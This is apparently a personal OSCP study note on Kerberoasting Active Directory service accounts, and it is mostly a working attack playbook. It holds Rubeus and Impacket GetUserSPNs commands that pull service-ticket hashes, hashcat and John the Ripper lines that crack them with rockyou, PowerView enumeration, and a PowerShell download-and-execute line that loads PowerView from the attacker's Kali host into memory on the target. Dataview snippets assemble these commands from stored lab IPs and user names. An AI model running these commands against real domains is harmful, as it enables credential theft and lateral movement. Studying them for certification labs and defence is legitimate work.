#kerberoasting #active-directory 

Tools: `Rubeus`, `Impacket`, `PowerView`, `GetUserSPNs.py`
## Rubeus
Kerberoast from local machine `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
Check what mode Hashcat needs to be in `hashcat --help | grep -i "Kerberos"`
Crack the retrieved hash `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r m/usr/share/hashcat/rules/best64.rule --force`
## Impacket GetUsersSPNs (Kerberoasting)
Retrieve Kerberoastable accounts `sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete` -> `sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
### 🔎 Step-by-Step Guide

Windows cmd to find svc accs
```
setspn -Q */*
```

---

## Service Accounts : Requires SVC accounts and creds of a standard user

Whenever getting access to domain credentials it is important to test a few of the tools from `impacket`. In this case we will use `GetUserSPNs.py` to extract encrypted passwords of any kerberoastable service accounts.

[[Clock Skew Time Sync]]

User:: svc_apache
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine"); const ip = page?.IP ?? "NO IP FOUND"; const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND"; const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit"); const user = pagea?.["User"] ?? "NO USER FOUND";
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine"); const ip = page?.IP ?? "NO IP FOUND"; const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND"; const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit"); const user = pagea?.["User"] ?? "NO USER FOUND"; // Fixed: changed page? to pagea? const command = `impacket-GetUserSPNs -request -dc-ip ${ip} ${discoveredDomain}/${user}`; dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const ip = page?.IP ?? "NO IP FOUND";
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit");
const user = pagea?.["User"] ?? "NO USER FOUND"; // Fixed: changed page? to pagea?

const command = `impacket-GetUserSPNs -request -dc-ip ${ip} ${discoveredDomain}/${user}`;

dv.paragraph("```bash\n" + command + "\n```");

```
```
impacket-GetUserSPNs 'oscp.exam/Eric.Wallows:Password' -dc-ip 10.10.162.152 -request
```

```
impacket-GetUserSPNs -request -dc-ip <DC_IP> DOMAIN/USER
```

Paste the entire hash including $krb5tgs$23$ into hash.txt
```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

or
```
hashcat -m 13100 [hashes] /usr/share/wordlists/rockyou.txt
```

---

Load PowerView.ps1 into memory 

On KALI
```
python -m http.server 80 --directory ~/Desktop/Tools/Windows
```

On TARGET
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = apage?.["filename"] ?? "NO FILENAME FOUND";

const command = `iex(new-object net.webclient).downloadstring('http://${KaliIP}:80/PowerView.ps1')`;

dv.paragraph("```bash\n" + command + "\n```");
```

Verify commands are loaded
```powershell
Get-Command Get-DomainUser
```
 
 2. Query all active user accounts with an SPN set 

 ```powershell
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
 ```
 
![[Pasted image 20260817222346.png]]

Kerberoasting is a technique that allows attackers to request a Kerberos ticket for a service associated with a Service Principal Name (SPN)

Transfer [[Rubeus.exe]] into VICTIM TARGET

Once Creds are obtained, use [[Runas]]

---

### **Windows — Rubeus**

```
# Enumerate/request Kerberoastable tickets
Rubeus.exe kerberoast

# Save output to a file
Rubeus.exe kerberoast /outfile:hashes.txt
```

---

If no results = password is not in the wordlist
#### 1. 🖥️ Enumerate SPNs (Windows - PowerView)
```
# Load PowerView
Import-Module .\PowerView.ps1

# Find accounts with SPNs
Get-DomainUser -SPN
```
#### 🎟️ 2. Request TGS for SPNs
```
# Using Rubeus
Rubeus.exe kerberoast

# Or manually with Impacket
python3 GetUserSPNs.py domain/user:password -dc-ip x.x.x.x
```
#### 4. 🔓 Crack the Hashes (Offline)
```
# Using Hashcat
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt

# Using John the Ripper
john --wordlist=wordlist.txt kerberoast_hashes.txt
```


